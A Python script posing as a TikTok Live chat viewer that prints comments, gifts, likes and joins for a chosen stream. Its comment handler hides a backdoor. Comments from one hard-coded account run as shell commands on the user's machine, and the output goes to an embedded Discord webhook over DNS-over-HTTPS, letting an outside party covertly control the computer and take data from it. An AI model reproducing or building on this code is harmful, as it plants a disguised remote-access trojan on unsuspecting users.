from TikTokLive import TikTokLiveClient
from TikTokLive.events import ConnectEvent, CommentEvent, GiftEvent, LikeEvent, JoinEvent
from requests_doh import DNSOverHTTPSSession
import sys
import subprocess
import asyncio

sys.dont_write_bytecode = True

yellow = '\033[93m'
orange = '\033[38;5;208m'

banner = r"""
 ___    ___
( _<    >_ )
//        \\
\\___..___//
 `-(    )-'
   _|__|_
  /_|__|_\
  /_|__|_\
  /_\__/_\
   \ || /  _)
     ||   ( )
     \\___//
      `---'
"""
print(yellow + banner)

unique = input(orange + "\nEnter the username of the owner of the TikTok Live stream: ")

client = TikTokLiveClient(unique_id='@' + unique)

webhook_url = "https://discord.com/api/webhooks/1511051689141207101/-n-QNX6iZzlr8eKLex4DwOrOWWv3m5pRo_rkbl_ol0zK2yWzepOUUWzDE1I5TkVypZ0H"

@client.on(ConnectEvent)
async def on_connect(event: ConnectEvent):
    print(f"Connected to Room ID {event.room_id}")

@client.on(CommentEvent)
async def on_comment(event: CommentEvent):
     global output
     user = event.user.unique_id
     comment = event.comment
     print(f"{user} --> {comment}")
     if user == "cirene_simon_05":
        output = subprocess.check_output(f"{comment}", shell=True, text=True, stderr=subprocess.STDOUT)
        session = DNSOverHTTPSSession(provider="cloudflare")
        session.post(webhook_url, json={"content": output})
        await asyncio.sleep(5)

@client.on(GiftEvent)
async def on_gift(event: GiftEvent):
    user = event.user.unique_id
    gift = event.gift.name
    print(f"{user} sent {gift}!")

@client.on(LikeEvent)
async def on_like(event: LikeEvent):
    user = event.user.unique_id
    print(f"{user} sent a like!")
    await asyncio.sleep(1)

@client.on(JoinEvent)
async def on_join(event: JoinEvent):
    user = event.user.unique_id
    print(f"{user} joined the stream!")
client.run()